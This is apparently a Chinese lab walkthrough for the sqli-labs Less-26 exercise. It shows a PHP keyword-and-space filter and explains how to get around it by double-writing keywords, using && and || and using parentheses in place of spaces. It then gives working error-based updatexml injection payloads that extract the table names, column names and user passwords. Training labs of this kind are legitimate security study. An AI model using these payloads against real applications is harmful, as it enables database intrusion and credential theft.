---
title: less26
url: https://www.yuque.com/u29002979/ep2zrx/vgqq95ls3mgqam0t
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

$id= preg_replace('/or/i',"", $id);			 //strip out OR (non case sensitive)
$id= preg_replace('/and/i',"", $id);		 //Strip out AND (non case sensitive)
$id= preg_replace('/[\/*]/',"", $id);	 //strip out /*
$id= preg_replace('/[--]/',"", $id);		 //Strip out --
$id= preg_replace('/[#]/',"", $id);			 //Strip out #
$id= preg_replace('/[\s]/',"", $id);		 //Strip out spaces空格和换行
$id= preg_replace('/[\/\\\\]/',"", $id); //Strip out slashes/\\\
```

字符型注入，单引号闭合**'**

> **\s过滤了空格和换行，**
> **解决and or可以双写或者用&&和||代替，**
> **解决注释需要强行闭合逃逸，**
> **需要空格的地方可以加上括号()或加号+**
> and or ——> && ||
>
> # --     ——> 闭合逃逸
>
> /s空格        ——> 括号

> All You Spaces and Comments belong to us.

提示**空格,and,注释**被过滤 <a name="y70Tw"></a>

## 注入点检查

`1'`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-26\index.php** on line **36**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

1. 单引号闭合'
2. 网站没有对报错信息进行过滤，我们可以使用基于报错的注入手段

`1 and 1=1 --+`

> Hint: Your Input is Filtered with following result: 11=1

发现and,空格和注释符号被过滤掉了

<a name="vzgqw"></a>

# 报错注入

<a name="Kcozu"></a>

## 爆破数据库名称

`-1'||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'` <a name="Pain7"></a>

## 爆破数据表名称

`-1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e),1)||'` <a name="LKNid"></a>

## 爆破字段名

`-1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()aandnd(table_name='users'))),0x7e),1)||'` <a name="Clssj"></a>

## 爆破字段内容

`-1'||updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,passwoorrd))from(users)),0x7e),1)||'`
